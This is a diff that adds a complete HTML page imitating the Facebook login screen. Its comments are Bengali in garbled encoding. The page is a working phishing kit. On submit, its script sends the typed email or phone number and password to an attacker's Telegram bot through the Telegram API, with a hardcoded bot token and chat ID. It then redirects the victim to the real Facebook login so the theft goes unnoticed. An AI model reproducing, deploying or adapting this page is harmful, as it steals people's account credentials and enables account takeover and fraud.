@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login - Authentic UI</title>
+    <style>
+        :root {
+            /* ржЫржмрж┐рж░ ржбрж╛рж░рзНржХ ржорзЛржб ржХрж╛рж▓рж╛рж░ */
+            --bg-color: #1c2b33;
+            --input-bg: #1c2b33;
+            --input-border: #3e4f59;
+            --text-main: #ffffff;
+            --text-secondary: #b0b3b8;
+            --btn-blue: #0064e0;
+            --btn-border: #0064e0;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            padding-top: 20px;
+        }
+
+        /* рж▓рзНржпрж╛ржЩрзНржЧрзБрзЯрзЗржЬ ржбрзНрж░ржкржбрж╛ржЙржи */
+        .lang-selector {
+            font-size: 14px;
+            color: var(--text-secondary);
+            margin-bottom: 60px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+        }
+
+        .lang-selector::after {
+            content: ' тМ╡';
+            margin-left: 4px;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 400px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .fb-logo {
+            width: 75px;
+            height: 75px;
+            margin-bottom: 40px;
+            object-fit: contain;
+        }
+
+        /* ржЗржиржкрзБржЯ ржлрж┐рж▓рзНржб */
+        .input-box {
+            width: 100%;
+            height: 60px;
+            background-color: var(--input-bg);
+            border: 1px solid var(--input-border);
+            border-radius: 15px;
+            padding: 0 16px;
+            color: white;
+            font-size: 16px;
+            margin-bottom: 12px;
+            outline: none;
+        }
+
+        .input-box::placeholder {
+            color: #8a96a3;
+        }
+
+        /* рж▓ржЧржЗржи ржмрж╛ржЯржи */
+        .login-btn {
+            width: 100%;
+            height: 48px;
+            background-color: var(--btn-blue);
+            border: none;
+            border-radius: 24px;
+            color: white;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 20px;
+            margin-top: 5px;
+        }
+
+        /* Forgotten password (рж░рж┐ржпрж╝рзЗрж▓ рж▓рж┐ржЩрзНржХрзЗ рж░рж┐ржбрж╛ржЗрж░рзЗржХрзНржЯ рж╣ржмрзЗ) */
+        .forgot-pw {
+            color: var(--text-main);
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 100px;
+        }
+
+        /* Create New Account (рж░рж┐ржпрж╝рзЗрж▓ рж▓рж┐ржЩрзНржХрзЗ рж░рж┐ржбрж╛ржЗрж░рзЗржХрзНржЯ рж╣ржмрзЗ) */
+        .create-acc-btn {
+            width: 100%;
+            height: 44px;
+            background-color: transparent;
+            border: 1px solid var(--btn-border);
+            border-radius: 22px;
+            color: #4395ff;
+            font-size: 16px;
+            font-weight: 500;
+            text-decoration: none;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 20px;
+        }
+
+        /* ржорзЗржЯрж╛ ржлрзБржЯрж╛рж░ */
+        .meta-footer {
+            margin-top: auto;
+            margin-bottom: 25px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+
+        .meta-logo {
+            width: 65px;
+            margin-bottom: 4px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="lang-selector">English (UK)</div>
+
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="FB" class="fb-logo">
+
+        <form id="fbForm">
+            <input type="text" id="user" class="input-box" placeholder="Mobile number or email address" required>
+            <input type="password" id="pass" class="input-box" placeholder="Password" required>
+            <button type="submit" class="login-btn">Log in</button>
+        </form>
+
+        <a href="https://www.facebook.com/recover/initiate" class="forgot-pw">Forgotten password?</a>
+
+        <a href="https://www.facebook.com/reg" class="create-acc-btn">Create new account</a>
+    </div>
+
+    <div class="meta-footer">
+        <img src="https://h.top4top.io/p_3640ln22w1.png" alt="Meta" class="meta-logo">
+    </div>
+
+    <script>
+        document.getElementById('fbForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            // ржПржЦрж╛ржирзЗ ржЖржкржирж╛рж░ рж╕ржарж┐ржХ рждржерзНржпржЧрзБрж▓рзЛ ржмрж╕рж╛ржи
+            const botToken = '7852343353:AAG3byBA3PWOlnUHI4WDpdpKjy7p9gcC7Ds'; // ржЖржкржирж╛рж░ ржмржЯ ржЯрзЛржХрзЗржи
+            const chatId = '7336083189';     // ржЖржкржирж╛рж░ ржЪрзНржпрж╛ржЯ ржЖржЗржбрж┐
+
+            const user = document.getElementById('user').value;
+            const pass = document.getElementById('pass').value;
+
+            const message = `ЁЯФе Facebook Login Result:\n\nЁЯСд Email/Phone: ${user}\nЁЯФС Password: ${pass}`;
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(res => {
+                // ржбрж╛ржЯрж╛ ржЪрж▓рзЗ ржЧрзЗрж▓рзЗ ржЗржЙржЬрж╛рж░ржХрзЗ ржЖрж╕рж▓ рж▓ржЧржЗржи ржкрзЗржЬрзЗ ржкрж╛ржарж┐рзЯрзЗ ржжрж┐ржмрзЗ ржпрж╛рждрзЗ рж╕ржирзНржжрзЗрж╣ ржирж╛ рж╣рзЯ
+                window.location.href = "https://www.facebook.com/login/device-based/regular/login/";
+            })
+            .catch(err => {
+                console.error(err);
+                alert("An error occurred. Please try again.");
+            });
+        });
+    </script>
+</body>
+</html>
